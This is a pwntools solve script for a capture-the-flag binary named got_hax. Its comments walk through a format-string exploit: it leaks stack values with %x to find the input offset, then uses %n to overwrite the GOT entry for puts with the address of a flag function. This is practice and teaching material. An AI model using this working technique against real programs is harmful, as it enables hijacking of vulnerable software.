#!/usr/bin/env python3

"""
WhatTheFuzz's submission for got_hax, a challenge given to me from my mentor,
@huckfinn.

This script can be used in the following manner:
python3 ./solve.py

Returns:
    The flag to solve the challenge.
"""

from pwn import *

exe = ELF("./got_hax")

context.binary = exe
context.log_level = 'info'
context.terminal = ['gnome-terminal', '-e']

MAX_HAX = b'10'
BANNER2 = b'On a scale of 1 to 10, how sweet are your hax?'

def conn(name):
    '''Establish the connection to the process, local or remote.
    '''
    io = process([exe.path, name])
    return io

def log_info():
    '''Get information about some of the program symbols.
    '''
    log.info(f'Address of puts in the GOT: {hex(exe.got["puts"])}')
    log.info(f'Address of get_your_flag in the symbol table: \
                                {hex(exe.symbols["get_your_flag"])}')

def find_input():
    '''Find where our input is on the stack. We need this because we will
    direct our `printf` call to write n number of bytes at this location.

    Returns an int representing the offset of our input on the stack.
    '''
    max_len_input = 39
    # We could do this one of two ways, with the debugger or by counting the
    # output.

    # Count the output.
    # We give the program a known string. We can then examine the output for
    # where the string appears.
    # We only need four bytes worth of characters to match on.
    known_string = cyclic(4)
    # |%x is the format string for hexadecimal with a pipe character
    # prefixing each address.
    name = known_string + max_len_input * b'|%x'

    # Start up the program and send the `name` that we just created..
    with conn(name) as io:
        io.sendlineafter(BANNER2, MAX_HAX)
        stack_offset = 0
        # Find the offset of the string we sent.
        line = io.recvline_contains(b'Goodbye')
        for i in line.split(b'|'):
            stack_offset += 1
            try:
                # Stop walking the stack when we find the string we sent.
                if binascii.unhexlify(i) == known_string:
                    break
            except:
                pass

        # We intentionally subtract one because the very first characters
        # printed will be our input before we have walked up the stack
        return stack_offset - 1

def main():
    '''Return the flag.
    '''

    # Determine where our input lies on the stack.
    offset_on_stack = find_input()

    log.info(f'The offset of our input on stack is: {offset_on_stack}')

    # Create the name we will send the program.
    name = b''

    # The address of `puts` in the GOT. We want to overwrite this with the
    # address of get_flag.
    name += p32(exe.got["puts"], endian='little')

    # The amount of padding we need to write. Since %n will write the number of
    # bytes output so far, this should equal the address of `get_flag` minus the
    # number of bytes written so far, in decimal.
    name += b'%' + str(exe.symbols["get_your_flag"] - len(name)).encode() + b'x'

    # Tell `printf` that we want the argument from the stack that lies at our
    # known offset. The function will act as though we actually passed it
    # `offset_on_stack` number of variables. At that offset lies our address to
    # `puts` in the GOT. We then overwrite this address with the number of bytes
    # written to stdout; this is the address of `get_flag`. See man 3 printf for
    # more information.
    name += b'%' + str(offset_on_stack).encode() + b'$n'

    log.info(f'The format string that we will pass to the program is: {name}')

    # Start up the program and send the `name` that we just created.
    with conn(name) as io:
        io.sendlineafter(b'On a scale of 1 to 10, how sweet are your hax?', \
                                                                     MAX_HAX)
        io.recvuntil(b'You GOT hax! Your flag is ')

        flag = io.recv().strip(b'\n')
        log.success(f'Flag: {flag}')

def time_func(func):
    '''Time the main function.
    '''

    start = time.time()
    func()
    end = time.time()

    log.info(f'Time: {end - start}')

if __name__ == '__main__':
    log_info()
    time_func(main)
